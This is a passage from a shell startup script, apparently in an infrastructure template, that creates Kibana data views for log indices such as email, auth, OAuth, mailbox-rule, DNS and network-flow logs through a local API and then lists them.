  docker logs "$(docker ps --format '{{.ID}} {{.Names}}' | awk '$2 ~ /nginx/ {print $1; exit}')" --tail 200 || true
  exit 12
fi

create_data_view() {
  local name="$1"
  local pattern="$2"

  resp=$(curl -s -u "$LAB_USER:$LAB_PASS" -w "\n%%{http_code}\n" \
    -X POST "http://localhost/api/data_views/data_view" \
    -H "Content-Type: application/json" \
    -H "kbn-xsrf: true" \
    -d "{
      \"data_view\": {
        \"title\": \"$${pattern}\",
        \"name\": \"$${name}\",
        \"timeFieldName\": \"@timestamp\"
      }
    }")

  body=$(echo "$resp" | sed '$d')
  http=$(echo "$resp" | tail -n 1)

  if [[ "$http" == "200" || "$http" == "201" || "$http" == "409" ]]; then
    echo "[+] Data view OK: $${name} -> $${pattern} (HTTP=$http)"
    return 0
  fi

  echo "[!] Failed to create data view $${name} ($${pattern}) HTTP=$http"
  echo "$body" | head -n 120
  return 1
}

create_data_view "email-logs" "email-logs-*"
create_data_view "auth-logs" "auth-logs-*"
create_data_view "oauth-events" "oauth-events-*"
create_data_view "mailbox-rules" "mailbox-rules-*"
create_data_view "drive-activity" "drive-activity-*"
create_data_view "audit-logs" "audit-logs-*"
create_data_view "dns-logs" "dns-logs-*"
create_data_view "network-flow" "network-flow-*"
create_data_view "workload-telemetry" "workload-telemetry-*"
create_data_view "cloud-storage" "cloud-storage-*"

echo "[+] Listing data views"
curl -s -u "$LAB_USER:$LAB_PASS" -H "kbn-xsrf: true" http://localhost/api/data_views \
  | jq -r '.data_view[] | "\(.name) -> \(.title)"' || true

echo "[+] Startup script completed successfully: $(date -Is)"
EOF
}